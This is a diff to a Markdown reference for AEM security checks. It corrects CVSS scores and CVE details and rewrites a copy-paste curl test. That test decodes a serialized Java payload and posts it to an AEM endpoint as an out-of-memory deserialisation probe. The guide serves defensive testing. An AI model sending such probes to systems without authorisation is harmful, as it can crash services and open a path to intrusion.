@@ -7,8 +7,10 @@ check you will find:
 * **Finding name** – the label printed in tool output
 * **Vulnerability class** – e.g. SSRF, XSS, XXE, RCE …
 * **CVE** – assigned identifier(s) where applicable
-* **CVSS score & rating** – based on the NVD base score (v3.1 where available,
-  v2.0 otherwise)
+* **CVSS score & rating** – exact NVD base score where an official CVE exists
+  (v3.1 where available, v2.0 otherwise); scores prefixed with `~` in the
+  quick-reference table are internal severity estimates for misconfigurations
+  that have no assigned CVE and are **not** official NVD scores
 * **Affected AEM versions** – known affected range
 * **Why the vulnerability exists** – short technical explanation
 * **How to test manually with `curl`** – a copy-paste command you can run
@@ -439,7 +441,7 @@ Reference: <https://github.com/0ang3el/aem-rce-bundle>
 | Finding name | `WCMDebugFilter` |
 | Vulnerability class | Reflected Cross-Site Scripting (XSS) |
 | CVE | **CVE-2016-7882** |
-| CVSS v3.x | ~6.1 (Medium) |
+| CVSS v3.1 | 6.1 (Medium) |
 | Affected versions | AEM 6.0 – 6.2 (patched in 6.2 SP1) |
 | Adobe bulletin | [APSB16-38](https://helpx.adobe.com/security/products/experience-manager/apsb16-38.html) |
 
@@ -739,12 +741,15 @@ Collections), achieve arbitrary RCE.
 
 ```bash
 # OOM probe – does NOT execute code; just tests for the vulnerability class.
+# Write the payload to a temp file first (binary-safe; avoids Bash here-string
+# NUL-byte stripping).
 # Note: on macOS use `base64 -D` (uppercase D) instead of `base64 -d`
+echo 'rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=' \
+  | base64 -d > /tmp/jobevent.bin
 curl -sk -X POST 'https://TARGET/libs/dam/cloud/proxy.json' \
   -H 'Referer: https://TARGET' \
   -F ':operation=job' \
-  -F 'file=@/dev/stdin;filename=jobevent;type=application/octet-stream' <<< \
-  $(echo 'rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=' | base64 -d)
+  -F 'file=@/tmp/jobevent.bin;filename=jobevent;type=application/octet-stream'
 
 # HTTP 500 with "Java heap space" in the body confirms the endpoint deserialises
 ```
@@ -760,7 +765,7 @@ Reference: <https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-web
 | Finding name | `WebDAV exposed` |
 | Vulnerability class | XXE / Path Traversal via WebDAV |
 | CVE | **CVE-2015-1833** |
-| CVSS v3.x | ~9.1 (Critical) |
+| CVSS v2.0 | 9.1 (Critical) |
 | Affected versions | Apache Jackrabbit ≤ 2.10.0 (bundled in AEM ≤ 6.1) |
 | Apache advisory | https://jackrabbit.apache.org/security-reports.html |
 
